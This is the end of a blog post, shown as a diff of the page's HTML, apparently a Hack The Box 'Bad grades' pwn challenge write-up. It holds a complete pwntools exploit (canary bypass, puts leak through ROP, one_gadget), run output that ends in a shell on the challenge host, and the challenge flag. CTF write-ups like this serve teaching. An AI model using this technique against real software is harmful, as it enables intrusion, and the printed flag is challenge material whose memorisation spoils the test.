class="line"><span class="comment"># Detecting overflow ---</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">first_vul</span>():</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">&quot;34&quot;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---</span></span><br><span class="line"><span class="comment"># Set the address variables ---</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;GOT puts address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_got)))</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;PLT puts address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">pop_rdi = rop.find_gadget([<span class="string">&quot;pop rdi&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">log.success(<span class="string">&quot;POP RDI gadget address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pop_rdi)))</span><br><span class="line">main_addr = <span class="number">0x00401108</span></span><br><span class="line">log.success(<span class="string">&quot;Main address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill_the_buffer</span>(<span class="params">grades_count</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Set the stack pointer at the 34th Byte&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(grades_count))</span><br><span class="line">    p.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">33</span>): </span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">&quot;.&quot;</span>) <span class="comment"># pass canary</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">&quot;.&quot;</span>) <span class="comment"># pass RBP</span></span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_pointer</span>(<span class="params">pointer_value</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Convert x64 pointer to double representation&#x27;&#x27;&#x27;</span></span><br><span class="line">    byte_string = p64(pointer_value)</span><br><span class="line">    hex_byte_string = binascii.hexlify(byte_string)</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;d&#x27;</span>, hex_byte_string.decode(<span class="string">&#x27;hex&#x27;</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Jump over stack canary and frame pointer &amp; leak puts address ---</span></span><br><span class="line">fill_the_buffer(<span class="number">39</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(double_pointer(pop_rdi)))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(double_pointer(puts_got)))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(double_pointer(puts_plt)))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(double_pointer(main_addr)))</span><br><span class="line">p.recvline() <span class="comment"># leak data to first 0x0a char</span></span><br><span class="line">leak = p.recvline() <span class="comment"># leak another line with puts address </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] leak another line with puts address:&quot;</span>, leak)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">leaked_puts = u64(leak.strip().ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.critical(<span class="string">&quot;Leaked puts address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(leaked_puts))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---</span></span><br><span class="line"><span class="comment"># Overflow again with calculated one gadget ---</span></span><br><span class="line">one_gadget = leaked_puts - libc.symbols[<span class="string">&quot;puts&quot;</span>] + <span class="number">0x4f432</span></span><br><span class="line">fill_the_buffer(<span class="number">36</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(double_pointer(one_gadget))) </span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]</span><br><span class="line">└─<span class="comment"># python getshell.py                                                                                               </span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/Bad_grades/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/Bad_grades/bad_grades&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] Loaded 14 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;bad_grades&#x27;</span></span><br><span class="line">[+] Opening connection to 178.128.160.242 on port 30441: Done</span><br><span class="line">[+] GOT puts address: 0x601fa8</span><br><span class="line">[+] PLT puts address: 0x400680</span><br><span class="line">[+] POP RDI gadget address: 0x401263</span><br><span class="line">[+] Main address: 0x401108</span><br><span class="line">Grade [36]: </span><br><span class="line">Grade [37]: </span><br><span class="line">Grade [38]: </span><br><span class="line">(<span class="string">&#x27;[+] leak another line with puts address:&#x27;</span>, <span class="string">&#x27;\xa0Zy/\xc1\x7f\n&#x27;</span>)</span><br><span class="line">[CRITICAL] Leaked puts address: 140467701897888</span><br><span class="line">Grade [36]: </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Your new average is: 134990801633253939234528747106260167272288995420515641120614684084693692875892821619221009832982853632238658860567790589577833938316859881291776.00</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=999(ctf) gid=999(ctf) <span class="built_in">groups</span>=999(ctf)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bad_grades</span><br><span class="line">flag.txt</span><br><span class="line">libc.so.6</span><br><span class="line">run_challenge.sh</span><br><span class="line">$ <span class="built_in">cat</span> flag.txt</span><br><span class="line">HTB&#123;c4n4ry_1s_4fr41d_0f_s1gn3d_numb3r5&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades13.jpg"></li>
+</ul>
+<h2 id="摘自-致敬原作-……"><a href="#摘自-致敬原作-……" class="headerlink" title="摘自(致敬原作)……"></a>摘自(致敬原作)……</h2><ul>
+<li>浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。</li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9rYXJvbC1tYXp1cmVrOTUubWVkaXVtLmNvbS9wd24tYmFkLWdyYWRlcy1jaGFsbGVuZ2UtaHRiLWU3NDdiZGE1ZTQ0Ng==">PWN Bad grades challenge - HTB<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/09/01/bad-grades/" title="Hack-The-Box-pwn-challenge[bad-grades]">https://fdlucifer.github.io/2021/09/01/bad-grades/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/01/racecar/" rel="prev" title="Hack-The-Box-pwn-challenge[racecar]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-pwn-challenge[racecar]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/09/01/PWN-methodology/" rel="next" title="PWN-LINUX技巧总结">
+                  PWN-LINUX技巧总结 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
